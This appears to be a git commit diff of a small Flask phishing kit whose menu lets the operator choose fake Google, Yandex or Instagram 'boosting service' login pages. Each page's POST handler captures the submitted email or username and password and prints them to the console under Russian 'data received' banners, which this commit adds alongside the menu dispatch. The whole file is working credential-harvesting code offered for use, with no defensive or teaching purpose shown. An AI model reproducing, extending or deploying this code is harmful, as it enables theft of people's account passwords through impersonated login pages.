0ccf3e1c700b3e72ba36e25bc8f9684e2e9f2429
DEFFORMATOR <64592327+DEFFORMATOR@users.noreply.github.com>
2020-09-04 23:30:49 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
 from flask import Flask, render_template , request
-
+from colorama import Fore, Back, Style
 def Google():
 	try:
 		app = Flask(__name__)
@@ -9,7 +9,9 @@ def Google():
 		def yandex_core():
 			if request.method == "POST":
 				try:
-					print("Почта :" + ' ' + request.form.get("email") + "\nПароль : " + request.form.get('password'))
+					print('\n\n\n' +Back.GREEN + "------------ ПОЛУЧЕНЫ ДАННЫЕ ! ------------" + '\n')
+					print("Почта :" + ' ' + request.form.get("email") + "\nПароль : " + request.form.get('password') )
+					print("\n" + Back.GREEN + "------------ ПОЛУЧЕНЫ ДАННЫЕ ! ------------" + '\n\n\n')
 				except:
 					return render_template("google.html")
 			else:
@@ -35,7 +37,9 @@ def yandex():
 		def yandex_core():
 			if request.method == "POST":
 				try:
+					print('\n\n\n' +Back.GREEN + "------------ ПОЛУЧЕНЫ ДАННЫЕ ! ------------" + '\n')
 					print("Юзернейм :" + ' ' + request.form.get("username") + "\nПароль : " + request.form.get('password'))
+					print("\n" + Back.GREEN + "------------ ПОЛУЧЕНЫ ДАННЫЕ ! ------------" + '\n\n\n')
 				except:
 					return render_template("yandex.html")
 			else:
@@ -60,7 +64,9 @@ def insta1():
 		def index():
 			if request.method == "POST":
 				try:
+					print('\n\n\n' +Back.GREEN + "------------ ПОЛУЧЕНЫ ДАННЫЕ ! ------------" + '\n')
 					print("Юзернейм :" + ' ' + request.form.get("username") + "\nПароль : " + request.form.get('password'))
+					print("\n" + Back.GREEN + "------------ ПОЛУЧЕНЫ ДАННЫЕ ! ------------" + '\n\n\n')
 				except:
 					return render_template("insta1.html")
 			else:
@@ -81,13 +87,13 @@ def ask():
 	print("1. Сервис накрутки инсты\n2. Yandex\n3.Google(Gmail)")
 	global step
 	step = input()
+	if int(step) == 1:
+		insta1()
+	elif int(step) == 2:
+		yandex()
+	elif int(step) == 3:
+		Google()
+	else:
+		print("Такого номера нету !")
+		ask()
 ask()
-if int(step) == 1:
-	insta1()
-elif int(step) == 2:
-	yandex()
-elif int(step) == 3:
-	Google()
-else:
-	print("Такого номера нету !")
-	ask()
